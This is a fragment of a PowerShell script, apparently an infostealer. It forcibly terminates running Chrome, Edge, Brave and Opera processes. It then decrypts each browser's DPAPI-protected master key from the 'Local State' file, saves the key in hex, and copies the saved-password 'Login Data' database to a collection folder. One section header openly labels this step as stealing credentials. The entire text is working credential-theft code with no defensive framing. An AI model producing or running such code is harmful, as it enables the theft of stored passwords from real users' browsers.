# ──────────────────────────────────────────────────────────────
# Identify and terminate ONLY running browsers
# ──────────────────────────────────────────────────────────────

Write-Log "Checking for running browsers..."

$browserProcesses = @{
    "Chrome" = "chrome"
    "Edge"   = "msedge"
    "Brave"  = "brave"
    "Opera"  = "opera"
}

$runningBrowsers = @()

foreach ($name in $browserProcesses.Keys) {
    $procName = $browserProcesses[$name]
    $processes = Get-Process -Name $procName -ErrorAction SilentlyContinue
    if ($processes) {
        $runningBrowsers += $name
        Write-Log "[$name] detected as running (PID(s): $($processes.Id -join ', '))"
        $processes | Stop-Process -Force -ErrorAction SilentlyContinue
    } else {
        Write-Log "[$name] not running"
    }
}

if ($runningBrowsers.Count -eq 0) {
    Write-Log "No supported browsers are currently running. No termination performed."
} else {
    Write-Log "Terminated $($runningBrowsers.Count) running browser(s): $($runningBrowsers -join ', ')"
    Start-Sleep -Seconds 4  # give time for file locks to release
}

# ──────────────────────────────────────────────────────────────
# Steal credentials ONLY from browsers that were running
# ──────────────────────────────────────────────────────────────

if ($runningBrowsers.Count -eq 0) {
    Write-Log "Skipping browser credential collection (no running browsers detected)"
} else {
    Write-Log "Collecting credentials from running browsers: $($runningBrowsers -join ', ')"

    $browsers = @{
        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
        "Opera"  = "$env:APPDATA\Opera Software\Opera Stable"
    }

    foreach ($name in $runningBrowsers) {
        $basePath = $browsers[$name]
        $localStatePath = Join-Path $basePath "Local State"

        if (-not (Test-Path $localStatePath)) {
            Write-Log "[$name] Local State not found at $localStatePath"
            continue
        }

        Write-Log "[$name] Processing..."

        try {
            $json = Get-Content $localStatePath -Raw | ConvertFrom-Json
            $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $masterKeyBytes = $encKey[5..($encKey.Length-1)]
            $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($masterKeyBytes, $null, 'CurrentUser')
            $keyHex = [BitConverter]::ToString($masterKey) -replace '-'
            $keyHex | Out-File "$dir\$($name)_masterkey.txt" -Encoding ascii
            Write-Log "[$name] Master key extracted"

            $profileFolder = if ($name -eq "Opera") { $basePath } else { Join-Path $basePath "Default" }
            $loginDbPath = Join-Path $profileFolder "Login Data"

            if (Test-Path $loginDbPath) {
                Copy-Item $loginDbPath "$dir\$($name)_LoginData.db" -Force
                Write-Log "[$name] Login Data copied"
            } else {
                Write-Log "[$name] Login Data not found at $loginDbPath"
            }
        }
        catch {
            Write-Log "[$name] ERROR: $($_.Exception.Message)"
        }
    }
}
